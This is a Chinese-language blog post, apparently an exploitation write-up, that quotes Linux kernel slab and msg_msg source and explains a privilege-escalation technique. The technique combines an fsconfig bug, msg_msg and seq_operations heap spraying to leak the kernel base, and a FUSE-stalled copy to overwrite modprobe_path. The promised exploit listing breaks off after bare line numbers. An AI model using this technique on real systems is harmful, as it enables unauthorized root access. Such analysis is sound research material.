<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *__kmalloc(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">s</span>;</span></span><br><span class="line">	<span class="keyword">void</span> *ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(size &gt; KMALLOC_MAX_CACHE_SIZE))</span><br><span class="line">		<span class="keyword">return</span> kmalloc_large(size, flags);</span><br><span class="line"></span><br><span class="line">	s = kmalloc_slab(size, flags);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(ZERO_OR_NULL_PTR(s)))</span><br><span class="line">		<span class="keyword">return</span> s;</span><br><span class="line"></span><br><span class="line">	ret = slab_alloc(s, flags, _RET_IP_);</span><br><span class="line"></span><br><span class="line">	trace_kmalloc(_RET_IP_, ret, size, s-&gt;size, flags);</span><br><span class="line"></span><br><span class="line">	ret = kasan_kmalloc(s, ret, size, flags);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__kmalloc);</span><br></pre></td></tr></table></figure>

<p>这里主要关注下面的<code>__kmalloc</code>函数，可以看到其中会先进入到<code>kmalloc_slab</code>获取对应的<code>slab</code>，其实根据动态调试的结果看到的是这里的slab与分配<code>ctx-&gt;legacy_data</code>时进入<code>kmem_cache_alloc_trace</code>函数的第一个参数是一致的所以我当时就很迷惑，随即请教了a3又看了一下<code>linux kernel 5.9</code>的commit才知道会在<code>slab_alloc</code>函数中出现问题。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *<span class="title">slab_alloc_node</span><span class="params">(struct kmem_cache *s,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">gfp_t</span> gfpflags, <span class="keyword">int</span> node, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">void</span> *object;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> *<span class="title">c</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> tid;</span><br><span class="line"></span><br><span class="line">	s = slab_pre_alloc_hook(s, gfpflags);</span><br><span class="line">	<span class="keyword">if</span> (!s)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">redo:</span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		tid = this_cpu_read(s-&gt;cpu_slab-&gt;tid);</span><br><span class="line">		c = raw_cpu_ptr(s-&gt;cpu_slab);</span><br><span class="line">	&#125; <span class="keyword">while</span> (IS_ENABLED(CONFIG_PREEMPT) &amp;&amp;</span><br><span class="line">		 unlikely(tid != READ_ONCE(c-&gt;tid)));</span><br><span class="line"></span><br><span class="line">	barrier();</span><br><span class="line"></span><br><span class="line">	object = c-&gt;freelist;</span><br><span class="line">	page = c-&gt;page;</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!object || !node_match(page, node))) &#123;</span><br><span class="line">		object = __slab_alloc(s, gfpflags, node, addr, c);</span><br><span class="line">		stat(s, ALLOC_SLOWPATH);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">void</span> *next_object = get_freepointer_safe(s, object);</span><br><span class="line">		<span class="keyword">if</span> (unlikely(!this_cpu_cmpxchg_double(</span><br><span class="line">				s-&gt;cpu_slab-&gt;freelist, s-&gt;cpu_slab-&gt;tid,</span><br><span class="line">				object, tid,</span><br><span class="line">				next_object, next_tid(tid)))) &#123;</span><br><span class="line"></span><br><span class="line">			note_cmpxchg_failure(<span class="string">&quot;slab_alloc&quot;</span>, s, tid);</span><br><span class="line">			<span class="keyword">goto</span> redo;</span><br><span class="line">		&#125;</span><br><span class="line">		prefetch_freepointer(s, next_object);</span><br><span class="line">		stat(s, ALLOC_FASTPATH);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	maybe_wipe_obj_freeptr(s, object);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(slab_want_init_on_alloc(gfpflags, s)) &amp;&amp; object)</span><br><span class="line">		<span class="built_in">memset</span>(object, <span class="number">0</span>, s-&gt;object_size);</span><br><span class="line"></span><br><span class="line">	slab_post_alloc_hook(s, gfpflags, <span class="number">1</span>, &amp;object);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *<span class="title">slab_alloc</span><span class="params">(struct kmem_cache *s,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">gfp_t</span> gfpflags, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> slab_alloc_node(s, gfpflags, NUMA_NO_NODE, addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数其实就是对<code>slab_alloc_node</code>函数的套娃操作，然而<code>slab_alloc_node</code>函数内部首先会调用<code>slab_pre_alloc_hook</code>函数，起先并未注意到其返回值也是s所以并未当回事，那么现在详细分析一下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct kmem_cache *<span class="title">slab_pre_alloc_hook</span><span class="params">(struct kmem_cache *s,</span></span></span><br><span class="line"><span class="params"><span class="function">						     <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	flags &amp;= gfp_allowed_mask;</span><br><span class="line"></span><br><span class="line">	fs_reclaim_acquire(flags);</span><br><span class="line">	fs_reclaim_release(flags);</span><br><span class="line"></span><br><span class="line">	might_sleep_if(gfpflags_allow_blocking(flags));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (should_failslab(s, flags))</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (memcg_kmem_enabled() &amp;&amp;</span><br><span class="line">	    ((flags &amp; __GFP_ACCOUNT) || (s-&gt;flags &amp; SLAB_ACCOUNT)))</span><br><span class="line">		<span class="keyword">return</span> memcg_kmem_get_cache(s);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到最后会判断是否开启了<code>memcg</code>选项，并检测调用时的flags，所以也就是在这个位置导致slab改变了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct kmem_cache *<span class="title">memcg_kmem_get_cache</span><span class="params">(struct kmem_cache *cachep)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mem_cgroup</span> *<span class="title">memcg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">memcg_cachep</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">memcg_cache_array</span> *<span class="title">arr</span>;</span></span><br><span class="line">	<span class="keyword">int</span> kmemcg_id;</span><br><span class="line"></span><br><span class="line">	VM_BUG_ON(!is_root_cache(cachep));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (memcg_kmem_bypass())</span><br><span class="line">		<span class="keyword">return</span> cachep;</span><br><span class="line"></span><br><span class="line">	rcu_read_lock();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(current-&gt;active_memcg))</span><br><span class="line">		memcg = current-&gt;active_memcg;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		memcg = mem_cgroup_from_task(current);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!memcg || memcg == root_mem_cgroup)</span><br><span class="line">		<span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line">	kmemcg_id = READ_ONCE(memcg-&gt;kmemcg_id);</span><br><span class="line">	<span class="keyword">if</span> (kmemcg_id &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line">	arr = rcu_dereference(cachep-&gt;memcg_params.memcg_caches);</span><br><span class="line"></span><br><span class="line">	memcg_cachep = READ_ONCE(arr-&gt;entries[kmemcg_id]);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!memcg_cachep))</span><br><span class="line">		memcg_schedule_kmem_cache_create(memcg, cachep);</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (percpu_ref_tryget(&amp;memcg_cachep-&gt;memcg_params.refcnt))</span><br><span class="line">		cachep = memcg_cachep;</span><br><span class="line">out_unlock:</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line">	<span class="keyword">return</span> cachep;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入函数内部查看会发现其就是对额外的结构体做的一系列操作</p>
<h3 id="msg-msg"><a href="#msg-msg" class="headerlink" title="msg_msg"></a>msg_msg</h3><p>至此可以开始认真分析关于此利用方法了，首先考虑的是如何实现泄漏内核地址。我们知道<code>msg_msg</code>结构体如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">	<span class="keyword">long</span> m_type;</span><br><span class="line">	<span class="keyword">size_t</span> m_ts;		<span class="comment">/* message text size */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line">	<span class="keyword">void</span> *security;</span><br><span class="line">	<span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其中<code>next</code>指针指向的是<code>msg_msgseg</code>结构体，而这个结构体在前面的文章中提到过，当我们发送的消息大小大于<code>0xfd0</code>时将超出范围的内容补充到<code>msg_msgseg</code>结构体，总体结构就是一个单向链表的结构。这里选择的办法肯定不能是内存搜索，这样存在的问题太多了，很容易造成<code>kernel panic</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct msg_msg *<span class="title">alloc_msg</span><span class="params">(<span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> **<span class="title">pseg</span>;</span></span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	msg = kmalloc(<span class="keyword">sizeof</span>(*msg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">	<span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	msg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	msg-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	len -= alen;</span><br><span class="line">	pseg = &amp;msg-&gt;next;</span><br><span class="line">	<span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"></span><br><span class="line">		cond_resched();</span><br><span class="line"></span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		seg = kmalloc(<span class="keyword">sizeof</span>(*seg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">		<span class="keyword">if</span> (seg == <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		*pseg = seg;</span><br><span class="line">		seg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">		pseg = &amp;seg-&gt;next;</span><br><span class="line">		len -= alen;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关注<code>msg_msgseg</code>结构体的分配过程可以知道的是在Linux kernel 5.4版本依旧是通过普通的slab申请的，所以这里的选择是尽可能小的生成<code>msg_msgseg</code>结构体，随后使用<code>seq_operations</code>结构体来泄漏出内核基地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> * (*start) (struct seq_file *m, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">void</span> (*stop) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">    <span class="keyword">void</span> * (*next) (struct seq_file *m, <span class="keyword">void</span> *v, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">int</span> (*show) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>在以往的文章中介绍过这个结构体，这里简单提一下，这个结构体是内部全为函数指针的结构体，所以可以很轻松的泄漏。按照a3的做法，这里泄漏的办法是在每生成一个<code>msg_msgseg</code>时就分配一个<code>seq_operations</code>结构体，在最后完成<code>msg_msg</code>结构体的堆喷之后又大量堆喷<code>seq_operations</code>结构体，这样可以大大提高成功率使二者挨在一起再通过修改<code>m_ts</code>成员即可实现泄漏。</p>
<p>那么接下来需要考虑的是任意地址写的问题了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct msg_msg *<span class="title">load_msg</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> __user *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err = -EFAULT;</span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">	msg = alloc_msg(len);</span><br><span class="line">	<span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(msg + <span class="number">1</span>, src, alen))</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (seg = msg-&gt;next; seg != <span class="literal">NULL</span>; seg = seg-&gt;next) &#123;</span><br><span class="line">		len -= alen;</span><br><span class="line">		src = (<span class="keyword">char</span> __user *)src + alen;</span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(seg + <span class="number">1</span>, src, alen))</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = security_msg_msg_alloc(msg);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里可以注意到的是在对<code>msg_msg</code>写完之后会进入下面的for循环，其会根据<code>next</code>指针然后再进行写，后面的写就是写入到<code>msg_msgseg</code>结构体中了。如果我们能够在第一次写的时候修改掉<code>msg_msg-&gt;next</code>指针即可实现任意地址写了。</p>
<p>面对上面的思路，使用<code>userfaultfd</code>是很明显可以实现的，不过既然这篇文章提到了<code>FUSE</code>那么这里肯定就使用<code>FUSE</code>了，不过思路都是一样的。所以这里的整体思路就是通过<code>mmap</code>创建两块连续的内存区域，让后一块内存区域和<code>FUSE</code>挂载点下的文件做映射，那么在读取下一块内存时就会进入到我们预先写到的<code>read</code>函数中去了，在这个处理函数中使用<code>fsconfig</code>中的漏洞去修改掉<code>msg_msg-&gt;next</code>指针，在结束处理函数之后就会继续往已经被我们修改的指针地址写入内容了，完成了任意地址写。这里因为只泄漏了内核基地址所以这里写的地方也选择的是<code>modprobe_path</code>进行提权。</p>
<h3 id="综上可得exp"><a href="#综上可得exp" class="headerlink" title="综上可得exp"></a>综上可得exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span 